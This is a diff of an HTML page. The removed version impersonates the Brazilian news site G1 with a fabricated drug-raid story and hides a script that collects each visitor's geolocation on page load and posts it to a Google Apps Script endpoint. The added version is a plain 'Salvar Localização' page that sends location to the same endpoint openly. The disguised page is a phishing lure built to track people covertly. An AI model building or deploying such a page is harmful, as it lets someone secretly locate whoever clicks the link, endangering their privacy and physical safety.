@@ -1,132 +1,49 @@
 <!DOCTYPE html>
-<html lang="pt-br">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>G1 - Notícias</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      margin: 0;
-      background-color: #f5f5f5;
-    }
-
-    header {
-      background-color: #c4170c;
-      padding: 10px 20px;
-      color: white;
-    }
-
-    header h1 {
-      margin: 0;
-      font-size: 28px;
-    }
-
-    nav {
-      background-color: #e62117;
-      color: white;
-      padding: 8px 20px;
-      font-size: 14px;
-    }
-
-    .container {
-      max-width: 800px;
-      margin: 20px auto;
-      background: white;
-      padding: 20px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-    }
-
-    .title {
-      font-size: 26px;
-      color: #c4170c;
-      margin-bottom: 10px;
-    }
-
-    .subinfo {
-      font-size: 14px;
-      color: #666;
-      margin-bottom: 20px;
-    }
-
-    .content {
-      font-size: 18px;
-      line-height: 1.6;
-    }
-
-    footer {
-      background-color: #c4170c;
-      color: white;
-      text-align: center;
-      padding: 10px;
-      margin-top: 40px;
-    }
-  </style>
+  <title>Salvar Localização</title>
 </head>
 <body>
-
-  <header>
-    <h1>G1</h1>
-  </header>
-
-  <nav>
-    <span>Notícias</span> &nbsp; | &nbsp; Política &nbsp; | &nbsp; Economia &nbsp; | &nbsp; Mundo &nbsp; | &nbsp; Tecnologia &nbsp; | &nbsp; Saúde
-  </nav>
-
-  <div class="container">
-    <div class="title">Plantação de maconha e laboratório de drogas são encontrados em casa na BR-265</div>
-    <div class="subinfo">25/07/2025 15h30 - Atualizado há 2 horas</div>
-    <div class="content">
-      <p>Uma plantação de maconha e um laboratório de drogas foram encontrados pela polícia dentro de uma residência localizada na BR-265, na zona rural de Lavras, em Minas Gerais. A operação foi conduzida pela Polícia Militar após denúncias anônimas.</p>
-
-      <p>Segundo as autoridades, no local foram apreendidas diversas mudas de cannabis, equipamentos para cultivo indoor e substâncias químicas usadas na fabricação de entorpecentes.</p>
-
-      <p>O responsável pela residência foi preso em flagrante e encaminhado à delegacia da cidade. A Polícia Civil segue investigando o caso para identificar possíveis conexões com o tráfico regional.</p>
-    </div>
-  </div>
-
-  <footer>
-    © 2025 G1 - Todos os direitos reservados
-  </footer>
+  <h1>Coletando localização...</h1>
+  <p id="status">Aguardando localização...</p>
 
   <script>
-    // Link real do Web App
-    const endpoint = "https://script.google.com/macros/s/AKfycbzW_6wV0dBULWzkWj8WO5jE9JcDVtqC0Vl3uzlHCU17g4s97DHcwR_ZOf0FIQd-uECc/exec";
+    const endpoint = "https://script.google.com/macros/s/AKfycbzW_6wV0dBULWzkWj8WO5jE9JcDVtqC0Vl3uzlHCU17g4s97DHcwR_ZOf0FIQd-uECc/exec"; // URL do Google Apps Script
 
-    if ("geolocation" in navigator) {
+    function salvarLocalizacao(latitude, longitude) {
+      fetch(endpoint, {
+        method: "POST",
+        body: JSON.stringify({ latitude, longitude }),
+        headers: {
+          "Content-Type": "application/json"
+        }
+      })
+      .then(response => response.text())
+      .then(data => {
+        document.getElementById("status").textContent = "Localização salva com sucesso!";
+        console.log(data);
+      })
+      .catch(error => {
+        document.getElementById("status").textContent = "Erro ao salvar.";
+        console.error(error);
+      });
+    }
+
+    if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
-        function(position) {
-          const latitude = position.coords.latitude;
-          const longitude = position.coords.longitude;
-
-          // Envia para o Google Sheets
-          fetch(endpoint, {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-              latitude: latitude,
-              longitude: longitude
-            })
-          });
-
-          // Exibe na página
-          document.body.insertAdjacentHTML('beforeend', 
-            `<div style="padding:20px; background:#eee; margin-top:20px;">
-               <strong>Localização enviada com sucesso:</strong><br>
-               Latitude: ${latitude}<br>
-               Longitude: ${longitude}
-             </div>`);
+        (position) => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          salvarLocalizacao(lat, lon);
         },
-        function(error) {
-          console.warn("Erro ao obter localização:", error.message);
+        (error) => {
+          document.getElementById("status").textContent = "Erro ao obter localização.";
+          console.error(error);
         }
       );
     } else {
-      console.warn("Geolocalização não é suportada pelo navegador.");
+      document.getElementById("status").textContent = "Geolocalização não suportada.";
     }
   </script>
-
 </body>
 </html>
